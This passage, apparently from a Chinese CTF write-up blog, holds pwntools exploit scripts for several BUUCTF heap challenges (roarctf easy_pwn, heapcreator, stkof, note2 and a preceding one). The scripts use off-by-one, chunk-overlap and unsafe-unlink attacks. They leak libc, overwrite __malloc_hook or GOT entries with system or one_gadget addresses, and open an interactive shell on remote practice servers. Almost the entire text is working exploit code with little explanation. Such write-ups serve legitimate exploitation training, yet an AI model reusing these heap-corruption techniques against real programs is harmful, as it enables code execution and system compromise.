class="line">p.sendline(content)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DeleteHeap</span>(<span class="params">idx</span>):</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">CreateHeap(<span class="number">0x30</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">CreateHeap(<span class="number">0x80</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">CreateHeap(<span class="number">0x10</span>,<span class="string">&#x27;cccc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">DeleteHeap(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x6020A0</span></span><br><span class="line">EditHeap(<span class="number">0</span>,<span class="number">0x50</span>,<span class="number">0x30</span> * <span class="string">&quot;a&quot;</span> + p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(<span class="number">0</span>)+p64(magic-<span class="number">0x10</span>))<span class="comment"># 修改heap1的fd和bk指针</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">CreateHeap(<span class="number">0x80</span>,<span class="string">&#x27;dddd&#x27;</span>) <span class="comment">#触发</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;4869&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="roarctf_2019_easy_pwnoff-by-one"><a class="markdownIt-Anchor" href="#roarctf_2019_easy_pwnoff-by-one">#</a> roarctf_2019_easy_pwn（off-by-one)</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26307</span>)</span><br><span class="line"><span class="comment"># r=process(&#x27;roarctf_2019_easy_pwn&#x27;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;size:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,data</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;index:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;size:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;content:&#x27;</span>)</span><br><span class="line">    r.send(data)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;index:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;index:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index))  </span><br><span class="line"></span><br><span class="line">malloc_hook=libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">realloc_hook=libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(malloc_hook)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(realloc_hook)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r,&quot;b calloc&quot;)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#idx0</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#idx1</span></span><br><span class="line">add(<span class="number">0x90</span>)<span class="comment">#idx2</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#idx3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">34</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0x20</span>)+p8(<span class="number">0xa1</span>))<span class="comment">#off by one </span></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x80</span>,p64(<span class="number">0</span>)*<span class="number">14</span>+p64(<span class="number">0xa0</span>)+p64(<span class="number">0x21</span>))<span class="comment">#by pass check </span></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x90</span>)<span class="comment">#idx1 chunk overlap</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xa1</span>))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">r.recv(<span class="number">0x20</span>)</span><br><span class="line">libc_base=u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))-<span class="number">0x3c4b78</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x90</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+p64(<span class="number">0</span>)*<span class="number">12</span>+p64(<span class="number">0x70</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x30</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+p64(malloc_hook+libc_base-<span class="number">0x23</span>)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#idx4</span></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">one_gadgets=[<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf1147</span>,<span class="number">0xf02a4</span>]</span><br><span class="line">edit(<span class="number">4</span>,<span class="number">27</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">11</span>+p64(libc_base+one_gadgets[<span class="number">2</span>])+p64(libc_base+realloc_hook+<span class="number">4</span>)) </span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="hitcontraining_heapcreatoroff-by-one"><a class="markdownIt-Anchor" href="#hitcontraining_heapcreatoroff-by-one">#</a> hitcontraining_heapcreator(off-by-one)</h1><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202202081012691.png" alt="image-20220208101203616"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">sh=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25982</span>)</span><br><span class="line"><span class="comment"># sh = process(&#x27;./heapcreator&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./heapcreator&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">length,value</span>):</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Size of Heap : &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="built_in">int</span>(length)))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Content of heap:&quot;</span>)</span><br><span class="line">    sh.sendline(value)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,value</span>):</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="built_in">int</span>(index)))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Content of heap : &quot;</span>)</span><br><span class="line">    sh.sendline(value)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="built_in">int</span>(index)))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="built_in">int</span>(index)))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">&#x27;cccc&#x27;</span>)</span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">&#x27;\x81&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">size = <span class="string">&#x27;\x08&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;d&#x27;</span>*<span class="number">0x40</span>+ size + p64(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">create(<span class="number">0x70</span>,payload)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Content : &#x27;</span>)</span><br><span class="line">free_addr = u64(sh.recvuntil(<span class="string">&#x27;Done&#x27;</span>)[:-<span class="number">5</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&quot;free&quot;</span>,free_addr)</span><br><span class="line">system_addr=free_addr+libc.dump(<span class="string">&quot;system&quot;</span>)-libc.dump(<span class="string">&quot;free&quot;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/weixin_45677731/article/details/107914807">https://blog.csdn.net/weixin_45677731/article/details/107914807</a></p><h1 id="hitcon2014_stkofunlink"><a class="markdownIt-Anchor" href="#hitcon2014_stkofunlink">#</a> hitcon2014_stkof(unlink)</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># sh=remote(&quot;node4.buuoj.cn&quot;,28995)</span></span><br><span class="line">sh=process(<span class="string">&quot;./stkof&quot;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./stkof&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">free=elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">ptr=<span class="number">0x602150</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size</span>):</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, size, content</span>):</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.send(content)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x100</span>)</span><br><span class="line">alloc(<span class="number">0x20</span>)</span><br><span class="line">alloc(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>)</span><br><span class="line">payload+=p64(<span class="number">0x20</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;OK&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(free)+p64(ptr-<span class="number">0x18</span>)+p64(puts_got)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">8</span>,p64(puts_plt))</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">base = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;OK&#x27;</span>)</span><br><span class="line">system_addr=base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(free)+p64(ptr-<span class="number">0x18</span>)+p64(ptr+<span class="number">0x10</span>)+<span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">8</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="zctf2016_note2unlink"><a class="markdownIt-Anchor" href="#zctf2016_note2unlink">#</a> zctf2016_note2(unlink)</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26179</span>)</span><br><span class="line"><span class="comment"># io = process(&quot;./note2&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./note2&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new_note</span>(<span class="params">size, content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;)&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_note</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_note</span>(<span class="params">index, choice, content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;]&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_note</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;/bin/sh&quot;</span>) <span class="comment">#name</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;ddd&quot;</span>)</span><br><span class="line"></span><br><span class="line">ptr_0 = <span class="number">0x602120</span></span><br><span class="line">fake_fd = ptr_0 - <span class="number">0x18</span></span><br><span class="line">fake_bk = ptr_0 - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">note0_content = <span class="string">&quot;\x00&quot;</span> * <span class="number">8</span> + p64(<span class="number">0xa1</span>) + p64(fake_fd) + p64(fake_bk)</span><br><span class="line">new_note(<span class="number">0x80</span>, note0_content) <span class="comment">#note0</span></span><br><span class="line">new_note(<span class="number">0x0</span>, <span class="string">&quot;aa&quot;</span>) <span class="comment">#note1</span></span><br><span class="line">new_note(<span class="number">0x80</span>, <span class="string">&quot;/bin/sh&quot;</span>) <span class="comment">#note2</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">delete_note(<span class="number">1</span>)</span><br><span class="line">note1_content = <span class="string">&quot;\x00&quot;</span> * <span class="number">16</span> + p64(<span class="number">0xa0</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">new_note(<span class="number">0x0</span>, note1_content)</span><br><span class="line"></span><br><span class="line">delete_note(<span class="number">2</span>) <span class="comment">#unlink</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment"># 泄漏libc</span></span><br><span class="line">free_got = elf.got[<span class="string">&quot;free&quot;</span>]</span><br><span class="line">payload = <span class="number">0x18</span> * <span class="string">&quot;a&quot;</span> + p64(free_got)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">edit_note(<span class="number">0</span>, <span class="number">1</span>, payload)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">show_note(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;is &quot;</span>)</span><br><span class="line"></span><br><span class="line">free_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_addr = free_addr - libc.symbols[<span class="string">&quot;free&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc address: &quot;</span> + <span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#get shell</span></span><br><span class="line">system_addr = libc_addr + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">one_gadget = libc_addr + <span class="number">0xf02a4</span></span><br><span class="line">edit_note(<span class="number">0</span>, <span class="number">1</span>, p64(one_gadget)) <span class="comment">#overwrite free got -&gt; system address</span></span><br><span class="line"><span class="comment">#io.sendlineafter(&#x27;option---&gt;&gt;&#x27;,&#x27;/bin/sh\x00&#x27;)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="wdb_2018_1st_babyheapunlinkuaf"><a class="markdownIt-Anchor" href="#wdb_2018_1st_babyheapunlinkuaf">#</a> 